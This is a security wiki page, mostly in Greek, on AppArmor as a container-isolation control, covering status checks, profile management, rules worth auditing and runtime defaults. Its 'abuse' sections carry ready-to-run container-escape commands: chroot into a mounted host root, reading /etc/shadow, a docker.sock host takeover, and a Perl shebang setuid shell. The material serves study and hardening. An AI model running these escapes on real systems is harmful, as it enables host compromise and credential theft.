# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Επισκόπηση

AppArmor είναι ένα **Mandatory Access Control** σύστημα που εφαρμόζει περιορισμούς μέσω προφίλ ανά πρόγραμμα. Σε αντίθεση με τους παραδοσιακούς ελέγχους DAC, οι οποίοι εξαρτώνται σε μεγάλο βαθμό από την ιδιοκτησία χρήστη και ομάδας, το AppArmor επιτρέπει στον kernel να επιβάλλει μια πολιτική που συνδέεται με τη διεργασία αυτή καθαυτή. Σε περιβάλλοντα container, αυτό έχει σημασία γιατί ένα workload μπορεί να έχει αρκετά παραδοσιακά προνόμια για να επιχειρήσει μια ενέργεια και παρ' όλα αυτά να του απορριφθεί επειδή το προφίλ του AppArmor δεν επιτρέπει το σχετικό path, mount, network behavior, ή χρήση capability.

Το πιο σημαντικό εννοιολογικό σημείο είναι ότι το AppArmor είναι **path-based**. Εξετάζει την πρόσβαση στο filesystem μέσω κανόνων path αντί μέσω ετικετών όπως κάνει το SELinux. Αυτό το καθιστά προσιτό και ισχυρό, αλλά σημαίνει επίσης ότι τα bind mounts και οι εναλλακτικές δομές path απαιτούν προσεκτική προσοχή. Εάν το ίδιο περιεχόμενο του host γίνει προσβάσιμο μέσω ενός διαφορετικού path, το αποτέλεσμα της πολιτικής μπορεί να μην είναι αυτό που ο operator περίμενε αρχικά.

## Ρόλος στην απομόνωση container

Οι έλεγχοι ασφάλειας container συχνά σταματούν στα capabilities και seccomp, αλλά το AppArmor παραμένει σημαντικό και μετά από αυτούς τους ελέγχους. Φανταστείτε ένα container που έχει περισσότερα παραδοσιακά προνόμια από ό,τι θα έπρεπε, ή ένα workload που χρειάστηκε μια επιπλέον capability για λειτουργικούς λόγους. Το AppArmor μπορεί ακόμα να περιορίσει την πρόσβαση σε αρχεία, τη συμπεριφορά mount, το networking και τα μοτίβα εκτέλεσης με τρόπους που σταματούν την προφανή πορεία κατάχρησης. Γι' αυτό η απενεργοποίηση του AppArmor "just to get the application working" μπορεί σιωπηλά να μετατρέψει μια απλώς ριψοκίνδυνη διαμόρφωση σε μία που είναι ενεργά εκμεταλλεύσιμη.

## Εργαστήριο

Για να ελέγξετε εάν το AppArmor είναι ενεργό στον host, χρησιμοποιήστε:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Για να δείτε υπό ποιον χρήστη εκτελείται η τρέχουσα διεργασία του container:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Η διαφορά είναι διδακτική. Στην κανονική περίπτωση, η διεργασία θα πρέπει να εμφανίζει ένα AppArmor context συνδεδεμένο με το προφίλ που επέλεξε το runtime. Στην περίπτωση unconfined, αυτό το επιπλέον επίπεδο περιορισμού εξαφανίζεται.

Μπορείτε επίσης να ελέγξετε τι πιστεύει ότι εφάρμοσε το Docker:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Χρήση κατά την εκτέλεση

Docker μπορεί να εφαρμόσει ένα προεπιλεγμένο ή προσαρμοσμένο προφίλ AppArmor όταν ο host το υποστηρίζει. Το Podman μπορεί επίσης να ενσωματωθεί με AppArmor σε συστήματα βασισμένα σε AppArmor, αν και σε διανομές που προτιμούν SELinux το άλλο MAC σύστημα συχνά κυριαρχεί. Το Kubernetes μπορεί να εκθέσει πολιτική AppArmor σε επίπεδο workload σε κόμβους που όντως υποστηρίζουν AppArmor. Το LXC και τα σχετικά περιβάλλοντα system-container της οικογένειας Ubuntu χρησιμοποιούν επίσης εκτενώς AppArmor.

Το πρακτικό σημείο είναι ότι το AppArmor δεν είναι "Docker feature". Είναι ένα χαρακτηριστικό του host-kernel που αρκετά runtimes μπορούν να επιλέξουν να εφαρμόσουν. Εάν ο host δεν το υποστηρίζει ή το runtime έχει εντολή να τρέξει unconfined, η υποτιθέμενη προστασία στην πραγματικότητα δεν υπάρχει.

Συγκεκριμένα για το Kubernetes, το σύγχρονο API είναι `securityContext.appArmorProfile`. Από το Kubernetes `v1.30`, οι παλαιότερες beta επισημάνσεις AppArmor έχουν αποσυρθεί. Σε υποστηριζόμενους hosts, `RuntimeDefault` είναι το προεπιλεγμένο προφίλ, ενώ `Localhost` δείχνει σε ένα προφίλ που πρέπει ήδη να είναι φορτωμένο στον κόμβο. Αυτό έχει σημασία κατά την αναθεώρηση επειδή ένα manifest μπορεί να φαίνεται AppArmor-aware ενώ εξακολουθεί να εξαρτάται πλήρως από την υποστήριξη στην πλευρά του node και τα προφορτωμένα προφίλ.

Μία λεπτομέρεια λειτουργικής σημασίας είναι ότι η ρητή ρύθμιση `appArmorProfile.type: RuntimeDefault` είναι αυστηρότερη από το να παραλειφθεί απλώς το πεδίο. Εάν το πεδίο οριστεί ρητά και ο node δεν υποστηρίζει AppArmor, η admission πρέπει να αποτύχει. Εάν το πεδίο παραλειφθεί, το workload μπορεί ακόμα να τρέξει σε κόμβο χωρίς AppArmor και απλώς να μην λάβει αυτό το επιπλέον επίπεδο περιορισμού. Από την πλευρά ενός attacker, αυτό είναι ένας καλός λόγος να ελέγξετε τόσο το manifest όσο και την πραγματική κατάσταση του node.

Σε hosts με AppArmor που υποστηρίζουν Docker, το πιο γνωστό προεπιλεγμένο είναι το `docker-default`. Αυτό το προφίλ παράγεται από το AppArmor template του Moby και είναι σημαντικό επειδή εξηγεί γιατί ορισμένα capability-based PoCs εξακολουθούν να αποτυγχάνουν σε ένα προεπιλεγμένο container. Σε γενικές γραμμές, το `docker-default` επιτρέπει την συνηθισμένη δικτύωση, απαγορεύει εγγραφές σε μεγάλο μέρος του `/proc`, απαγορεύει πρόσβαση σε ευαίσθητα τμήματα του `/sys`, μπλοκάρει λειτουργίες mount και περιορίζει το ptrace ώστε να μην είναι γενικό primitive για probing του host. Η κατανόηση αυτής της βάσης βοηθά να διακρίνουμε "το container έχει `CAP_SYS_ADMIN`" από "το container μπορεί πραγματικά να χρησιμοποιήσει αυτή την ικανότητα εναντίον των kernel interfaces που με ενδιαφέρουν".

## Διαχείριση Προφίλ

Τα προφίλ AppArmor συνήθως αποθηκεύονται κάτω από το `/etc/apparmor.d/`. Μία κοινή σύμβαση ονομασίας είναι να αντικαθίστανται οι κάθετες στη διαδρομή του εκτελέσιμου με τελείες. Για παράδειγμα, ένα προφίλ για `/usr/bin/man` συνήθως αποθηκεύεται ως `/etc/apparmor.d/usr.bin.man`. Αυτή η λεπτομέρεια έχει σημασία τόσο στην άμυνα όσο και στην αξιολόγηση, διότι μόλις γνωρίζετε το ενεργό όνομα προφίλ, μπορείτε συχνά να εντοπίσετε γρήγορα το αντίστοιχο αρχείο στον host.

Χρήσιμες εντολές διαχείρισης στην πλευρά του host περιλαμβάνουν:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Ο λόγος που αυτές οι εντολές έχουν σημασία σε μια αναφορά για την ασφάλεια container είναι ότι εξηγούν πώς δημιουργούνται πραγματικά τα προφίλ, φορτώνονται, μεταβαίνουν σε complain mode και τροποποιούνται μετά από αλλαγές στην εφαρμογή. Αν ένας χειριστής έχει την τάση να μεταφέρει τα προφίλ σε complain mode κατά τη διάρκεια του troubleshooting και να ξεχνά να αποκαταστήσει την επιβολή, το container μπορεί να φαίνεται προστατευμένο στην τεκμηρίωση ενώ στην πραγματικότητα συμπεριφέρεται πολύ πιο χαλαρά.

### Δημιουργία και Ενημέρωση Προφίλ

`aa-genprof` μπορεί να παρακολουθήσει τη συμπεριφορά της εφαρμογής και να βοηθήσει στη δημιουργία ενός προφίλ διαδραστικά:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` μπορεί να δημιουργήσει ένα πρότυπο προφίλ που μπορεί αργότερα να φορτωθεί με το `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Όταν το binary αλλάζει και η πολιτική χρειάζεται ενημέρωση, το `aa-logprof` μπορεί να αναπαράγει τις απορρίψεις που βρέθηκαν στα logs και να βοηθήσει τον χειριστή να αποφασίσει εάν θα τις επιτρέψει ή θα τις απορρίψει:
```bash
sudo aa-logprof
```
### Καταγραφές

Οι αρνήσεις του AppArmor συχνά εμφανίζονται μέσω του `auditd`, του syslog ή εργαλείων όπως το `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Αυτό είναι χρήσιμο επιχειρησιακά και επιθετικά. Οι αμυνόμενοι το χρησιμοποιούν για να βελτιώσουν τα προφίλ. Οι επιτιθέμενοι το χρησιμοποιούν για να μάθουν ποια ακριβώς διαδρομή ή λειτουργία αρνείται και αν το AppArmor είναι ο έλεγχος που μπλοκάρει ένα exploit chain.

### Προσδιορισμός του Ακριβούς Αρχείου Προφίλ

Όταν ένα runtime εμφανίζει ένα συγκεκριμένο όνομα προφίλ AppArmor για ένα container, συχνά είναι χρήσιμο να αντιστοιχίσετε αυτό το όνομα στο αρχείο προφίλ στον δίσκο:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Αυτό είναι ιδιαίτερα χρήσιμο κατά την ανασκόπηση στο host επειδή γεφυρώνει το κενό μεταξύ "the container says it is running under profile `lowpriv`" και "the actual rules live in this specific file that can be audited or reloaded".

### Κανόνες υψηλής σημασίας προς έλεγχο

Όταν μπορείτε να διαβάσετε ένα profile, μην σταματάτε σε απλές γραμμές `deny`. Ορισμένοι τύποι κανόνων αλλάζουν ουσιωδώς το πόσο χρήσιμο θα είναι το AppArmor απέναντι σε μια προσπάθεια escape από container:

- `ux` / `Ux`: εκτελεί το target binary unconfined. Εάν ένας προσβάσιμος helper, shell, ή interpreter επιτρέπεται υπό το `ux`, αυτό είναι συνήθως το πρώτο που πρέπει να δοκιμάσετε.
- `px` / `Px` και `cx` / `Cx`: κάνουν profile transitions κατά το exec. Δεν είναι απαραίτητα κακά, αλλά αξίζει να ελεγχθούν γιατί μια transition μπορεί να οδηγήσει σε πολύ πιο ευρύ profile από το τρέχον.
- `change_profile`: επιτρέπει σε μια task να μεταβεί σε άλλο φορτωμένο profile, άμεσα ή στο επόμενο exec. Εάν το destination profile είναι ασθενέστερο, αυτό μπορεί να γίνει η προτιμητέα δίοδος escape από ένα περιοριστικό domain.
- `flags=(complain)`, `flags=(unconfined)`, or newer `flags=(prompt)`: αυτά πρέπει να αλλάξουν το πόση εμπιστοσύνη τοποθετείτε στο profile. Το `complain` καταγράφει denials αντί να τα επιβάλλει, το `unconfined` αφαιρεί το boundary, και το `prompt` εξαρτάται από μια userspace διαδρομή αποφάσεων αντί για καθαρό kernel-enforced deny.
- `userns` or `userns create,`: οι νεότερες πολιτικές AppArmor μπορούν να μεσολαβήσουν στη δημιουργία user namespaces. Εάν ένα container profile το επιτρέπει ρητά, nested user namespaces παραμένουν σε ισχύ ακόμα και όταν η πλατφόρμα χρησιμοποιεί AppArmor ως μέρος της στρατηγικής hardening της.

Χρήσιμο host-side grep:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Αυτός ο τύπος audit είναι συχνά πιο χρήσιμος από το να κοιτάζει κανείς εκατοντάδες συνήθεις κανόνες αρχείων. Αν ένα breakout εξαρτάται από την εκτέλεση ενός helper, την είσοδο σε ένα νέο namespace ή την απόδραση σε ένα λιγότερο περιοριστικό profile, η απάντηση συχνά κρύβεται σε αυτούς τους κανόνες προσανατολισμένους στις μεταβάσεις αντί στις προφανείς γραμμές τύπου `deny /etc/shadow r`.

## Λανθασμένες ρυθμίσεις

Το πιο προφανές σφάλμα είναι `apparmor=unconfined`. Οι διαχειριστές συχνά το θέτουν ενώ αποσφαλματώνουν (debugging) μια εφαρμογή που απέτυχε επειδή το profile απέκλεισε σωστά κάτι επικίνδυνο ή απροσδόκητο. Αν η σημαία παραμείνει σε production, ολόκληρο το επίπεδο MAC έχει ουσιαστικά αφαιρεθεί.

Ένα ακόμη λεπτό πρόβλημα είναι η υπόθεση ότι τα bind mounts είναι ακίνδυνα επειδή τα δικαιώματα αρχείων φαίνονται φυσιολογικά. Εφόσον το AppArmor βασίζεται σε διαδρομές (path-based), η έκθεση host paths κάτω από εναλλακτικές τοποθεσίες mount μπορεί να αλληλεπιδράσει άσχημα με τους κανόνες διαδρομής. Ένα τρίτο λάθος είναι η λήθη ότι ένα όνομα profile σε ένα αρχείο ρυθμίσεων σημαίνει πολύ λίγα αν ο host kernel δεν επιβάλλει πραγματικά το AppArmor.

## Κατάχρηση

Όταν το AppArmor απουσιάζει, λειτουργίες που προηγουμένως ήταν περιορισμένες μπορεί ξαφνικά να δουλέψουν: ανάγνωση ευαίσθητων paths μέσω bind mounts, πρόσβαση σε μέρη του procfs ή sysfs που θα έπρεπε να ήταν πιο δύσκολα στην χρήση, εκτέλεση ενεργειών σχετικών με mount εάν capabilities/seccomp επίσης το επιτρέπουν, ή χρήση διαδρομών που ένα profile κανονικά θα απαγόρευε. Το AppArmor είναι συχνά ο μηχανισμός που εξηγεί γιατί μια προσπάθεια breakout βασισμένη σε capabilities "θα έπρεπε να δουλεύει" στη θεωρία αλλά αποτυγχάνει στην πράξη. Αφαιρέστε το AppArmor, και η ίδια προσπάθεια μπορεί να αρχίσει να πετυχαίνει.

Αν υποψιάζεστε ότι το AppArmor είναι το κύριο πράγμα που σταματά μια αλυσίδα κατάχρησης τύπου path-traversal, bind-mount ή mount-based, το πρώτο βήμα συνήθως είναι να συγκρίνετε τι γίνεται προσβάσιμο με και χωρίς profile. Για παράδειγμα, αν ένα host path είναι mounted μέσα στο container, ξεκινήστε ελέγχοντας αν μπορείτε να το διασχίσετε και να το διαβάσετε:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Εάν το container έχει επίσης μια επικίνδυνη capability όπως η `CAP_SYS_ADMIN`, μία από τις πιο πρακτικές δοκιμές είναι να ελέγξετε αν το AppArmor είναι αυτό που μπλοκάρει λειτουργίες mount ή την πρόσβαση σε ευαίσθητα συστήματα αρχείων του kernel:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Σε περιβάλλοντα όπου ένα host path είναι ήδη διαθέσιμο μέσω ενός bind mount, η απώλεια του AppArmor μπορεί επίσης να μετατρέψει ένα read-only information-disclosure issue σε άμεση πρόσβαση αρχείων του host:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Το νόημα αυτών των εντολών δεν είναι ότι το AppArmor μόνο του δημιουργεί το breakout. Είναι ότι μόλις αφαιρεθεί το AppArmor, πολλοί filesystem και mount-based δρόμοι κακόχρησης γίνονται άμεσα δοκιμάσιμοι.

### Πλήρες Παράδειγμα: AppArmor Disabled + Host Root Mounted

Εάν το container έχει ήδη το host root bind-mounted στο `/host`, η αφαίρεση του AppArmor μπορεί να μετατρέψει ένα blocked filesystem abuse path σε πλήρες host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Μόλις το shell εκτελείται μέσω του host filesystem, το workload έχει ουσιαστικά ξεφύγει από τα όρια του container:
```bash
id
hostname
cat /etc/shadow | head
```
### Πλήρες Παράδειγμα: AppArmor Απενεργοποιημένο + Runtime Socket

Εάν ο πραγματικός φραγμός ήταν το AppArmor γύρω από το runtime state, μια mounted socket μπορεί να είναι αρκετή για μια πλήρη escape:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Η ακριβής διαδρομή εξαρτάται από το mount point, αλλά το τελικό αποτέλεσμα είναι το ίδιο: ο AppArmor δεν εμποδίζει πλέον την πρόσβαση στο runtime API, και το runtime API μπορεί να ξεκινήσει ένα container που συμβιβάζει τον host.

### Πλήρες Παράδειγμα: Path-Based Bind-Mount Bypass

Επειδή ο AppArmor είναι βασισμένος σε διαδρομές, η προστασία του `/proc/**` δεν προστατεύει αυτόματα το ίδιο περιεχόμενο procfs του host όταν είναι προσβάσιμο μέσω διαφορετικής διαδρομής:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Ο αντίκτυπος εξαρτάται από το τι ακριβώς είναι προσαρτημένο και από το αν η εναλλακτική διαδρομή παρακάμπτει επίσης άλλους ελέγχους, αλλά αυτό το μοτίβο είναι ένας από τους πιο ξεκάθαρους λόγους για τους οποίους το AppArmor πρέπει να αξιολογείται μαζί με τη διάταξη των mount points και όχι απομονωμένα.

### Full Example: Shebang Bypass

Η πολιτική AppArmor μερικές φορές στοχεύει μια διαδρομή ερμηνευτή με τρόπο που δεν λαμβάνει πλήρως υπόψη την εκτέλεση script μέσω shebang handling. Ένα ιστορικό παράδειγμα περιελάμβανε τη χρήση ενός script της οποίας η πρώτη γραμμή δείχνει σε έναν περιορισμένο ερμηνευτή:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Ένα τέτοιο παράδειγμα είναι σημαντικό ως υπενθύμιση ότι η πρόθεση ενός προφίλ και η πραγματική σημασιολογία εκτέλεσης μπορεί να αποκλίνουν. Κατά την ανασκόπηση του AppArmor σε περιβάλλοντα container, οι αλυσίδες διερμηνευτών και οι εναλλακτικές διαδρομές εκτέλεσης αξίζουν ιδιαίτερη προσοχή.

## Έλεγχοι

Ο στόχος αυτών των ελέγχων είναι να απαντηθούν γρήγορα τρία ερωτήματα: είναι ενεργοποιημένο το AppArmor στον host; είναι η τρέχουσα διεργασία περιορισμένη; και εφάρμοσε πραγματικά το runtime ένα προφίλ σε αυτό το container;
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
What is interesting here:

- If `/proc/self/attr/current` shows `unconfined`, the workload is not benefiting from AppArmor confinement.
- If `aa-status` shows AppArmor disabled or not loaded, any profile name in the runtime config is mostly cosmetic.
- If `docker inspect` shows `unconfined` or an unexpected custom profile, that is often the reason a filesystem or mount-based abuse path works.
- If `/sys/kernel/security/apparmor/profiles` does not contain the profile you expected, the runtime or orchestrator configuration is not enough by itself.
- If a supposedly hardened profile contains `ux`, broad `change_profile`, `userns`, or `flags=(complain)` style rules, the practical boundary may be much weaker than the profile name suggests.

If a container already has elevated privileges for operational reasons, leaving AppArmor enabled often makes the difference between a controlled exception and a much broader security failure.

## Προεπιλογές runtime

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Ενεργοποιημένο από προεπιλογή σε hosts που υποστηρίζουν AppArmor | Uses the `docker-default` AppArmor profile unless overridden | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Εξαρτάται από τον host | AppArmor is supported through `--security-opt`, but the exact default is host/runtime dependent and less universal than Docker's documented `docker-default` profile | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Προεπιλογή υπό όρους | If `appArmorProfile.type` is not specified, the default is `RuntimeDefault`, but it is only applied when AppArmor is enabled on the node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` with a weak profile, nodes without AppArmor support |
| containerd / CRI-O under Kubernetes | Ακολουθεί την υποστήριξη του node/runtime | Common Kubernetes-supported runtimes support AppArmor, but actual enforcement still depends on node support and workload settings | Same as Kubernetes row; direct runtime configuration can also skip AppArmor entirely |

Για το AppArmor, η πιο σημαντική μεταβλητή συχνά είναι ο host, όχι μόνο το runtime. Μια ρύθμιση προφίλ σε ένα manifest δεν δημιουργεί περιορισμό σε έναν κόμβο όπου το AppArmor δεν είναι ενεργοποιημένο.

## References

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
